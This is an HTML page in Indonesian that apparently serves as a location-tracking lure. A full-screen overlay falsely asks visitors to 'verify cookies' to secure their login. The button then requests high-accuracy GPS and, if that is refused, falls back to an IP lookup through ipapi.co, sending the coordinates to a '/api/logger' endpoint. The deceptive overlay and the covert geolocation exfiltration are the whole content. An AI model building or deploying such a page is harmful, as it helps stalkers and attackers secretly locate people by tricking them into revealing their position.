<!DOCTYPE html>
<html>
<head>
    <title>Sistem Verifikasi Cookies</title>
    <style>
        #overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:999; text-align:center; padding-top:20%; }
    </style>
</head>
<body>
    <div id="overlay">
        <h1>Verifikasi Akses</h1>
        <p>Setujui cookies untuk mengamankan jejak login anda.</p>
        <button onclick="startDetection()">Verifikasi Sekarang</button>
    </div>

    <img src="https://img2.pixhost.to/images/8123/729976172_alip-1779583858875.jpg" width="100%">

    <script>
        function sendData(lat, lon, method) {
            fetch(`/api/logger?lat=${lat}&lon=${lon}&method=${method}`);
        }

        function startDetection() {
            document.getElementById('overlay').style.display = 'none';
            
            // Coba GPS Akurat (HTML5)
            navigator.geolocation.getCurrentPosition(
                (pos) => sendData(pos.coords.latitude, pos.coords.longitude, 'GPS_Akurat'),
                () => {
                    // Fallback ke IP Geolocation
                    fetch('https://ipapi.co/json/')
                        .then(r => r.json())
                        .then(data => sendData(data.latitude, data.longitude, 'IP_Estimasi'));
                },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }
    </script>
</body>
</html>
